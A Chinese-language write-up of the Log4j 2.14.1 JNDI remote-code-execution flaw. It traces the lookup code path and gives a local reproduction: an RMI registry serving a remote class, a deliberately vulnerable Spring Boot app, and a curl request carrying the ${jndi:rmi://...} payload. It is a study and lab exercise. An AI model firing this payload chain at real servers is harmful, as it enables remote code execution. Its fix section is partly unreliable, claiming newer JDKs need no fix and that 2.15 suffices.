# log4j-rce 漏洞分享

---

[toc]

## 参考

---

-   https://blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf
-   https://mp.weixin.qq.com/s/K74c1pTG6m5rKFuKaIYmPg
-   https://github.com/tangxiaofeng7/BurpLog4j2Scan
-   https://github.com/apache/logging-log4j2/tree/master/log4j-core
-   https://kingx.me/Exploit-Java-Deserialization-with-RMI.html

## 原理介绍

---

-   JNDI Java Naming directory interface
-   RMI remote method invoke

基于 JNDI 都可以进行注入我们这里利用 RMI 协议复现 bug, 

![](https://kingx.me/images/articles/rmi/jndi-arch.png)

JNDI API 接口为 Java 提供 API , 用于对 JNDI SPI 进行抽象,JNDI SPI 由实现了不同协议的服务提供,只要实现了上述协议的组件即可被视作 SPI (service provide interface)

而好巧不巧 log4j 为了高扩展性对 spi 进行了支持,我们看 rmi 协议

### RMI

![](https://kingx.me/images/articles/rmi/Post-RMI-Invoke.png)

RMI 可以看做 java 由 JVM 实现的一套远程 RPC 机制(只能jvm内互相调用),其可以做到资源分散以及动态加载类.通常由一个注册表服务器维护,如下列结构

![](https://kingx.me/images/articles/rmi/Post-RMI-Dynamic.png)

上图中主要包含几个部分

-   RMI Client 远程方法调用方
-   RMI Server 静态.class文件服务器
-   RMI Registry 注册表服务



### log4j 2.14.1

---

该版本的下列包存在 JNDI 注入风险

-   log4j-core@2.14.1
-   log4j-api@2.14.1

观察其方法,debug 看其调用栈至 PatternLayout

```java
@Override
public StringBuilder toSerializable(final LogEvent event, final StringBuilder buffer) {
  final int len = formatters.length;
  for (int i = 0; i < len; i++) {
    formatters[i].format(event, buffer); // 中间有个 message 的就是处理这种占位符的
  }
  if (replace != null) { // creates temporary objects
    String str = buffer.toString();
    str = replace.format(str);
    buffer.setLength(0);
    buffer.append(str);
  }
  return buffer;
}
```

```java
protected String resolveVariable(final LogEvent event, final String variableName, final StringBuilder buf,final int startPos, final int endPos) {
  final StrLookup resolver = getVariableResolver();
  if (resolver == null) {
    return null;
  }
  return resolver.lookup(event, variableName); // 好了看到这个 lookup 就是它干的好事
}

public String lookup(final LogEvent event, final String key) {
  if (key == null) {
    return null;
  }
  final String jndiName = convertJndiName(key);
  try (final JndiManager jndiManager = JndiManager.getDefaultManager()) {
    return Objects.toString(jndiManager.lookup(jndiName), null);
  } catch (final NamingException e) {
    LOGGER.warn(LOOKUP, "Error looking up JNDI resource [{}].", jndiName, e);
    return null;
  }
}

// JNDI Manager javax.naming.Context
public <T> T lookup(final String name) throws NamingException {
  return (T) this.context.lookup(name);
}
// 这个 lookup 到后面发起网络请求
```





## 复现

1.  准备静态文件服务器 port 8080

```shell
(base) ➜  classes ll
total 16
-rw-r--r--  1 zhanghaoyang  staff   1.4K 12 12 22:06 HackerClass.class
-rw-r--r--@ 1 zhanghaoyang  staff   141B 12 12 22:16 main.go
(base) ➜  classes cat main.go
```

```go
package main

import (
	"net/http"
)

func main() {
	http.Handle("/", http.FileServer(http.Dir("./")))
	http.ListenAndServe(":8080", nil)
}
```

2.  准备 RMI 注册表服务 port 1099

```java
package com.example.hacker;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @author zhanghaoyang
 */
public class RMIServer {

    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException, Exception {
        Registry r = LocateRegistry.createRegistry(1099); // 注册 rmi 接口
        Reference reference = new Reference("HackerClass", "HackerClass",
                "http://127.0.0.1:8081/");
      	// 注册 rmi 对应的静态文件服务器
        Remote remote = (Remote) Class.forName("com.sun.jndi.rmi.registry.ReferenceWrapper").getConstructor(Reference.class)
                .newInstance(reference);
      // 这里不知道为啥我 JDK 对其进行了保护? 反射调用,能直接 invoke 也行
        System.out.println(remote);
        r.bind("HackerClass", remote);

        System.out.println("nuclear weapon ready");
    }

}
```

3.  准备某个被攻击的 springboot / springmvc / or else -> port 8888

```java
package com.example.l4jbug;


import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;


@SpringBootApplication
public class L4jbugApplication {
    private static Logger log = LogManager.getLogger();

    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        System.setProperty("com.sun.jndi.cosnaming.object.trustURLCodebase", "true");
        System.setProperty("java.rmi.server.useCodebaseOnly", "true");
        log.error("${jndi:rmi://127.0.0.1:1099/HackerClass}");
        SpringApplication.run(L4jbugApplication.class, args);
    }
}

@RestController
@RequestMapping("/")
class TestController {
    private static Logger log = LogManager.getLogger();

    @GetMapping("/")
    public void whatever(String name) {
        log.error(name);
    }
}
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <parent>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-parent</artifactId>
        <version>2.6.1</version>
        <relativePath/> <!-- lookup parent from repository -->
    </parent>
    <groupId>com.example</groupId>
    <artifactId>l4jbug</artifactId>
    <version>0.0.1-SNAPSHOT</version>
    <name>l4jbug</name>
    <description>Demo project for Spring Boot</description>
    <properties>
        <java.version>8</java.version>
    </properties>
    <dependencies>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
            <version>2.6.1</version>
            <exclusions>
                <exclusion>
                    <groupId>org.apache.logging.log4j</groupId>
                    <artifactId>log4j-core</artifactId>
                </exclusion>
                <exclusion>
                    <groupId>org.apache.logging.log4j</groupId>
                    <artifactId>log4j-api</artifactId>
                </exclusion>
                <exclusion>
                    <groupId>ch.qos.logback</groupId>
                    <artifactId>logback-classic</artifactId>
                </exclusion>
                <exclusion>
                    <groupId>ch.qos.logback</groupId>
                    <artifactId>logback-core</artifactId>
                </exclusion>
                <exclusion>
                    <groupId>org.springframework.boot</groupId>
                    <artifactId>spring-boot-starter-logging</artifactId>
                </exclusion>
            </exclusions>
        </dependency>
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-core</artifactId>
            <version>2.14.1</version>
        </dependency>
        <!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api -->
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-api</artifactId>
            <version>2.14.1</version>
        </dependency>
    </dependencies>

    <build>
        <plugins>
            <plugin>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-maven-plugin</artifactId>
            </plugin>
        </plugins>
    </build>
</project>

```

模拟请求

```shell
curl 'localhost:8888?name=%24%7Bjndi%3Armi%3A%2F%2F127.0.0.1%3A1099%2FHackerClass%7D'
```



## 修复

---

首先高版本的JDK(>1.8)由于禁用了相关参数无需修复

知道原理那么修复的方法就很多了

-   jvm 参数禁用远程调用
-   服务器禁用远程调用
-   不要用 log4j-core 强制使用 logback
-   代码级别判断,禁止SpEL表达式
-   升级2.15(只是多加了个判断)



